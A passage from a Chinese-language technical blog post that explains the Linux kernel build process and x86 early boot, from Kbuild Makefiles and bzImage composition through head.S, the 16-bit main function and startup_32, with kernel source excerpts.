class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>drivers/tty</p><p>Kconfig 文件记录了 make menuconfig 时的选项</p><p>Makefile 文件是针对 drivers/tty 下所有源码的 Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-<span class="token variable">$</span><span class="token punctuation">(</span>CONFIG_TTY<span class="token punctuation">)</span><span class="token operator">+=</span> tty_io.o n_tty.o tty_ioctl.o tty_ldisc.o \   tty_buffer.o tty_port.o tty_mutex.o tty_ldsem.o<span class="token comment">#CONFIG_TTY值对应Kconfig文件中的config TTY</span>obj-<span class="token variable">$</span><span class="token punctuation">(</span>CONFIG_LEGACY_PTYS<span class="token punctuation">)</span><span class="token operator">+=</span> pty.o......<span class="token comment"># obj-y 表示要编译到内核中,obj-m 表示要编译成驱动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>每个目录编译后会生成一个 built-in.o 文件，是目录下所有 obj-y 下所有 .o 文件的链接文件，这个 built-in.o 文件也会与上层目录的 built-in.o 文件链接在一起</p></li><li><p>编译成完整内核镜像，层层目录返回到顶层目录，所有的 built-in.o 文件会链接生成一个 vmlinux 文件，这个 vmlinux 文件会转换成 vmlinux.bin 并压缩为 vmlinux.bin.gz（<a href="https://zhuanlan.zhihu.com/p/571078063">vmlinux是如何被编译出来的</a>）</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token keyword">export</span> KBUILD_LDS          <span class="token operator">:=</span> arch/<span class="token variable">$</span><span class="token punctuation">(</span>SRCARCH<span class="token punctuation">)</span>/kernel/vmlinux.lds<span class="token comment">#使用的连接脚本，告诉编译器怎么链接成最终的可执行文件</span>vmlinux-dirs<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/,%,<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">filter</span> %/, <span class="token variable">$</span><span class="token punctuation">(</span>init-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>init-m<span class="token punctuation">)</span> \     <span class="token variable">$</span><span class="token punctuation">(</span>core-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>core-m<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>drivers-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>drivers-m<span class="token punctuation">)</span> \     <span class="token variable">$</span><span class="token punctuation">(</span>net-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>net-m<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-m<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>virt-y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#要链接的源码目录</span>vmlinux-alldirs<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">sort</span> <span class="token variable">$</span><span class="token punctuation">(</span>vmlinux-dirs<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/,%,<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">filter</span> %/, \     <span class="token variable">$</span><span class="token punctuation">(</span>init-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>core-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>drivers-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>net-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>virt-<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>init-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>init-y<span class="token punctuation">)</span><span class="token punctuation">)</span>core-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>core-y<span class="token punctuation">)</span><span class="token punctuation">)</span>drivers-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>drivers-y<span class="token punctuation">)</span><span class="token punctuation">)</span>net-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>net-y<span class="token punctuation">)</span><span class="token punctuation">)</span>libs-y1<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/lib.a, <span class="token variable">$</span><span class="token punctuation">(</span>libs-y<span class="token punctuation">)</span><span class="token punctuation">)</span>libs-y2<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>libs-y<span class="token punctuation">)</span><span class="token punctuation">)</span>libs-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-y1<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-y2<span class="token punctuation">)</span>virt-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>virt-y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#所有目录下的built-in.o</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="02-Linux初始化">02 | Linux初始化</h2><h3 id="vmlinuz文件结构">vmlinuz文件结构</h3><ul><li><p>GRUB 会加载 Linux 的内核映像 <code>vmlinuz</code>，初始化内核并移交到内核继续执行</p></li><li><p>/boot 目录下的 vmlinuz 文件由 Linux 编译生成的 bzImage 文件复制而来</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#linux/arch/x86/boot/Makefile</span><span class="token symbol">install</span><span class="token punctuation">:</span>sh <span class="token variable">$</span><span class="token punctuation">(</span>srctree<span class="token punctuation">)</span>/<span class="token variable">$</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>/install.sh <span class="token variable">$</span><span class="token punctuation">(</span>KERNELRELEASE<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/bzImage \System.map <span class="token string">"$(INSTALL_PATH)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>bzImage 需要三个依赖文件：setup.bin、vmlinux.bin、tools目录下build程序</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#linux/arch/x86/boot/Makefile</span><span class="token symbol"><span class="token variable">$</span>(obj)/bzImage</span><span class="token punctuation">:</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/setup.bin <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/vmlinux.bin <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/tools/build FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,image<span class="token punctuation">)</span><span class="token operator">@</span><span class="token variable">$</span><span class="token punctuation">(</span>kecho<span class="token punctuation">)</span> <span class="token string">'Kernel: $@ is ready'</span> <span class="token string">' (#'</span>`cat .version`<span class="token string">')'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>build是一个HOST OS下的应用程序，作用是将setup.bin、vmlinux.bin两个文件拼接成一个bzImage文件</p></blockquote></li><li><p>setup.bin 文件是由 arch/x86/boot 目录下一系列对应的程序源代码文件编译链接产生</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#目标文件由arch/x86/boot/目录下对应的程序源代码文件编译产生</span>setup-y<span class="token operator">+=</span> a20.o bioscall.o cmdline.o copy.o cpu.o cpuflags.o cpucheck.o<span class="token comment">#……</span>SETUP_OBJS <span class="token operator">=</span> <span class="token variable">$</span><span class="token punctuation">(</span>addprefix <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/,<span class="token variable">$</span><span class="token punctuation">(</span>setup-y<span class="token punctuation">)</span><span class="token punctuation">)</span>LDFLAGS_setup.elf<span class="token operator">:=</span> -m elf_i386 -T<span class="token symbol"><span class="token variable">$</span>(obj)/setup.elf</span><span class="token punctuation">:</span> <span class="token variable">$</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>/setup.ld <span class="token variable">$</span><span class="token punctuation">(</span>SETUP_OBJS<span class="token punctuation">)</span> FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,ld<span class="token punctuation">)</span>OBJCOPYFLAGS_setup.bin<span class="token operator">:=</span> -O binary<span class="token symbol"><span class="token variable">$</span>(obj)/setup.bin</span><span class="token punctuation">:</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/setup.elf FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,objcopy<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>vmlinux.bin 文件依赖于 arch/x86/boot/compressed 目录下的 vmlinux，vmlinux 则由该目录下的 head_32.o/head_64.o、cpuflags.o 等文件及 piggy.o 链接而成</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#linux/arch/x86/boot/Makefile</span>OBJCOPYFLAGS_vmlinux.bin <span class="token operator">:=</span> -O binary -R .note -R .comment -S<span class="token symbol"><span class="token variable">$</span>(obj)/vmlinux.bin</span><span class="token punctuation">:</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/compressed/vmlinux FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,objcopy<span class="token punctuation">)</span><span class="token comment">#vmlinux.bin文件依赖于linux/arch/x86/boot/compressed/目录下的vmlinux目标</span><span class="token comment">#linux/arch/x86/boot/compressed/Makefile</span>vmlinux-objs-y <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/vmlinux.lds <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/head_<span class="token variable">$</span><span class="token punctuation">(</span>BITS<span class="token punctuation">)</span>.o <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/misc.o \<span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/string.o <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/cmdline.o <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/error.o \<span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/piggy.o <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/cpuflags.o<span class="token comment">#……</span><span class="token symbol"><span class="token variable">$</span>(obj)/vmlinux</span><span class="token punctuation">:</span> <span class="token variable">$</span><span class="token punctuation">(</span>vmlinux-objs-y<span class="token punctuation">)</span> FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,check-and-link-vmlinux<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>piggy.o 由 piggy.S 汇编代码生成而来，piggy.S 是编译内核时由 <code>mkpiggy</code> 动态创建，piggy.S 包含了 vmlinux.bin.gz 内核映像文件，还定义了解压时需要的各种信息，包括压缩内核映像的长度、解压后的长度等</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#linux/arch/x86/boot/compressed/Makefile</span>quiet_cmd_mkpiggy <span class="token operator">=</span> MKPIGGY <span class="token variable">$@</span>      cmd_mkpiggy <span class="token operator">=</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/mkpiggy <span class="token variable">$&lt;</span> &gt; <span class="token variable">$@</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token punctuation">(</span> rm -f <span class="token variable">$@</span> <span class="token punctuation">;</span> false <span class="token punctuation">)</span>targets <span class="token operator">+=</span> piggy.S<span class="token symbol"><span class="token variable">$</span>(obj)/piggy.S</span><span class="token punctuation">:</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/vmlinux.bin.<span class="token variable">$</span><span class="token punctuation">(</span>suffix-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>/mkpiggy FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,mkpiggy<span class="token punctuation">)</span><span class="token comment">#suffix-y表示内核压缩方式对应的后缀</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>mkpiggy 是内核自带的一个工具程序，它把输出方式重定向到文件，从而产生 piggy.S 汇编文件</p></blockquote></li><li><p>arch/x86/boot/compressed 目录下 vmlinux.bin 是由 objcopy 工具通过最顶层目录下的 vmlinux 生成（去除了文件的符号信息和重定位信息），并将其压缩成 vmlinux.bin.gz</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#linux/arch/x86/boot/compressed/Makefile</span>OBJCOPYFLAGS_vmlinux.bin <span class="token operator">:=</span>  -R .comment -S<span class="token symbol"><span class="token variable">$</span>(obj)/vmlinux.bin</span><span class="token punctuation">:</span> vmlinux FORCE<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> if_changed,objcopy<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="内核初始化">内核初始化</h3><h4 id="从-start开始">从_start开始</h4><ul><li><p>GRUB 将 vmlinuz 的 setup.bin 部分读到内存地址 <code>0x90000</code> 处，然后跳转到 <code>0x90200</code> 开始执行，跳过了512字节的 bootsector, 从 <code>_start</code> 开始</p></li><li><p>同时 GRUB 将 vmlinuz 的 vmlinux.bin 部分放在1MB（<code>0x100000</code>）开始的内存空间中，setup.bin 中通过 protected_mode_jump 函数跳转进入到 vmlinux.bin</p></li><li><p>setup.bin 文件的入口 _start 在 head.S 文件中定义</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#linux/arch/x86/boot/head.S.code16.section ".bstext", "ax".global bootsect_startbootsect_start:# Normalize the start addressljmp$BOOTSEG, $start2start2:#……# offset 512, entry point.globl_start_start:.byte0xeb# short (2-byte) jump.bytestart_of_setup-1f# 跳转start_of_setup-1f#……#这里是一个庞大的数据结构，定义了启动时所需的默认参数，与arch/x86/include/uapi/asm/bootparam.h文件中的struct setup_header一一对应start_of_setup:# Force %es = %dsmovw%ds, %axmovw%ax, %es# ds = escld# 主要指定si、di寄存器的自增方向，即si++ di++movw%ss, %dxcmpw%ax, %dx# %ds == %ss?movw%sp, %dxje2f# -&gt; assume %sp is reasonably set# 如果ss为空则建立新栈movw$_end, %dxtestb$CAN_USE_HEAP, loadflagsjz1fmovwheap_end_ptr, %dx1:addw$STACK_SIZE, %dxjnc2fxorw%dx, %dx# Prevent wraparound2:# Now %dx should point to the end of our stack spaceandw$~3, %dx# dword align (might as well...)jnz3fmovw$0xfffc, %dx# Make sure we're not zero3:movw%ax, %ssmovzwl%dx, %esp# Clear upper half of %espsti# 栈已经初始化好，开中断pushw%dspushw$6flretw# cs=ds ip=6：跳转到标号6处6:# Check signature at end of setupcmpl$0x5a5aaa55, setup_sigjnesetup_bad# Zero the bssmovw$__bss_start, %dimovw$_end+3, %cxxorl%eax, %eaxsubw%di, %cxshrw$2, %cxrep; stosl# Jump to C code (should not return)calllmain# 调用C语言main函数#……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>硬盘中 MBR 如果是由 GRUB 写入的 boot.img，那么 head.S 中的 bootsector 对于硬盘启动是无用的</p></blockquote></li><li><p>setup_header 结构定义在 arch/x86/include/uapi/asm/bootparam.h 文件中，GRUB 会填充这个 setup_header 结构，将内核启动需要的信息写入到对应位置</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">setup_header</span> <span class="token punctuation">{</span>    __u8    setup_sects<span class="token punctuation">;</span>        <span class="token comment">//setup大小</span>    __u16   root_flags<span class="token punctuation">;</span>         <span class="token comment">//根标志   </span>    __u32   syssize<span class="token punctuation">;</span>            <span class="token comment">//系统文件大小</span>    __u16   ram_size<span class="token punctuation">;</span>           <span class="token comment">//内存大小</span>    __u16   vid_mode<span class="token punctuation">;</span>        __u16   root_dev<span class="token punctuation">;</span>           <span class="token comment">//根设备号</span>    __u16   boot_flag<span class="token punctuation">;</span>          <span class="token comment">//引导标志</span>    <span class="token comment">//……</span>    __u32   realmode_swtch<span class="token punctuation">;</span>     <span class="token comment">//切换回实模式的函数地址     </span>    __u16   start_sys_seg<span class="token punctuation">;</span>        __u16   kernel_version<span class="token punctuation">;</span>     <span class="token comment">//内核版本    </span>    __u8    type_of_loader<span class="token punctuation">;</span>     <span class="token comment">//引导器类型 我们这里是GRUB</span>    __u8    loadflags<span class="token punctuation">;</span>          <span class="token comment">//加载内核的标志 </span>    __u16   setup_move_size<span class="token punctuation">;</span>    <span class="token comment">//移动setup的大小</span>    __u32   code32_start<span class="token punctuation">;</span>       <span class="token comment">//将要跳转到32位模式下的地址 </span>    __u32   ramdisk_image<span class="token punctuation">;</span>      <span class="token comment">//初始化内存盘映像地址，里面有内核驱动模块 </span>    __u32   ramdisk_size<span class="token punctuation">;</span>       <span class="token comment">//初始化内存盘映像大小</span>    <span class="token comment">//……</span><span class="token punctuation">}</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://www.kernel.org/doc/Documentation/x86/boot.txt">Linux/x86 引导协议</a>：引导程序加载内核前确定好数据交换方式叫做引导协议，内核中引导协议相关部分的代码在 arch/x86/boot/header.S 中，内核会在这个文件中标明自己的对齐要求、是否可以重定位以及希望的加载地址等信息，同时也会预留空位，由引导加载程序在加载内核时填充，比如 initramfs 的加载位置和大小等信息</p></blockquote></li></ul><h4 id="16位的main函数">16位的main函数</h4><ul><li><p>head.S 中调用的 main 函数在 arch/x86/boot/main.c 文件中定义</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//定义boot_params变量</span><span class="token keyword">struct</span> <span class="token class-name">boot_params</span> boot_params <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>HEAP <span class="token operator">=</span> _end<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>heap_end <span class="token operator">=</span> _end<span class="token punctuation">;</span><span class="token comment">/* Default end of heap = no heap */</span><span class="token comment">//...</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">/* First, copy the boot header into the "zeropage" */</span>    <span class="token comment">/* 将setup_header结构复制到boot_params结构中的hdr变量中 */</span><span class="token function">copy_boot_params</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* 初始化早期引导所用的console */</span><span class="token function">console_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cmdline_find_option_bool</span><span class="token punctuation">(</span><span class="token string">"debug"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"early console in setup code\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* 初始化堆 */</span><span class="token function">init_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 检查CPU是否支持运行Linux */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">validate_cpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Unable to boot - please use a kernel appropriate "</span>     <span class="token string">"for your CPU.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 告诉BIOS我们打算在什么CPU模式下运行它 */</span><span class="token function">set_bios_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 查看物理内存空间布局 */</span><span class="token function">detect_memory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 初始化键盘 */</span><span class="token function">keyboard_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Query Intel SpeedStep (IST) information */</span><span class="token function">query_ist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* 查询APM BIOS电源管理信息 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_APM<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_APM_MODULE<span class="token punctuation">)</span></span></span><span class="token function">query_apm_bios</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">/* 查询EDD BIOS扩展数据区域的信息 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_EDD<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_EDD_MODULE<span class="token punctuation">)</span></span></span><span class="token function">query_edd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">/* 设置显卡的图形模式 */</span><span class="token function">set_video</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* 进入CPU保护模式，不会返回 */</span><span class="token function">go_to_protected_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//go_to_protected_mode -&gt; protected_mode_jump(pmjump.S)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>切换CPU到保护模式后跳入 vmlinux.bin 文件中的 startup_32 函数重新加载段描述符，如果是64位的系统，就要进入 startup_64 函数，切换到CPU到长模式，最后调用 extract_kernel 函数解压内核，并进入内核 startup_64 函数，由此Linux内核开始运行</p></blockquote></li></ul><h4 id="startup-32函数">startup_32函数</h4><ul><li><p>定义在 arch/x86/boot/compressed/head64.S<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p></li><li><p>使用 grub 程序引导实际是从 startup_32 开始而不是 startup_64</p></li><li><p>startup_32 中需要重新加载段描述符，然后是栈的建立和检测CPU是否支持长模式</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__HEAD.code32ENTRY(startup_32)cld/* * 检查 KEEP_SEGMENTS 标记（loadflags） * 如果在设置了 KEEP_SEGMENTS 就跳转到最近的 1f 标签，当没有 1f 标签，则用 __BOOT_DS 更新段寄存器 * 如果没有设置，需要重置 ds , ss 和 es 段寄存器到一个基地址为 0 的普通段中 */testb $KEEP_SEGMENTS, BP_loadflags(%esi)jnz 1fclimovl$(__BOOT_DS), %eaxmovl%eax, %dsmovl%eax, %esmovl%eax, %ss1:/* 确定 startup_32 的地址 *//* bootparams 结构体包含一个特殊字段 scratch，将其作为 call 指令的临时栈 */leal(BP_scratch+4)(%esi), %espcall1f1:popl%ebp/* 跳转到 1f 标签并且把该标签的地址放入 ebp 寄存器 */subl$1b, %ebp/* 用标签的地址减去偏移地址可得 startup_32 地址 *//* setup a stack and make sure cpu supports long mode. */movl$boot_stack_end, %eax/* eax = 0x0 + boot_stack_end */addl%ebp, %eax/* eax = startup_32 + boot_stack_end */movl%eax, %espcallverify_cputestl%eax, %eax/* 如果 eax 的值为可以继续 */jnzno_longmode#......ENDPROC(startup_32)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>计算重定位地址，即计算解压缩之后的地址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">/* * Compute the delta between where we were compiled to run at * and where the code will actually run at. */#ifdef CONFIG_RELOCATABLEmovl%ebp, %ebx/* ebp 是 startup_32 标签的物理地址 */movlBP_kernel_alignment(%esi), %eaxdecl%eaxaddl%eax, %ebxnotl%eaxandl%eax, %ebxcmpl$LOAD_PHYSICAL_ADDR, %ebx/* 对齐后与 LOAD_PHYSICAL_ADDR 的值进行比较 */jae1f#endifmovl$LOAD_PHYSICAL_ADDR, %ebx1:/* Target address to relocate to for decompression */movlBP_init_size(%esi), %eaxsubl$_end, %eaxaddl%eax, %ebx/* ebx 包含应临时移动内核映像的地址 */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>内核重定位的意义：默认的内核基地址由内核配置项 <code>CONFIG_PHYSICAL_START</code> 的值所确定，其默认值为 <code>0x1000000</code> 或 <code>16 MB</code> ，如果内核崩溃了，内核开发者需要一个配置于不同地址加载的 <code>救援内核</code> 来进行 <a href="https://www.kernel.org/doc/Documentation/kdump/kdump.txt">kdump</a>，Linux 内核提供了特殊的配置选项以解决此问题：<code>CONFIG_RELOCATABLE</code>，设置此选项的内核可以从不同的地址启动</p></blockquote></li><li><p>如果CPU支持长模式，需要设置64位的全局描述表，开启CPU的PAE物理地址扩展特性，再设置最初的MMU页表，最后开启分页并进入长模式，跳转到 <code>startup_64</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">/* * Prepare for entering 64 bit mode *//* 更新GDT *//* Load new GDT with the 64bit segments using 32bit descriptor */lealgdt(%ebp), %eaxmovl%eax, gdt+2(%ebp)lgdtgdt(%ebp)/* Enable PAE mode */movl%cr4, %eaxorl$X86_CR4_PAE, %eaxmovl%eax, %cr4 /*  * Build early 4G boot pagetable  *//* Initialize Page tables to 0 */lealpgtable(%ebx), %edixorl%eax, %eaxmovl$(BOOT_INIT_PGT_SIZE/4), %ecxrepstosl/* Build Level 4 */lealpgtable + 0(%ebx), %edileal0x1007 (%edi), %eaxmovl%eax, 0(%edi)/* Build Level 3 */lealpgtable + 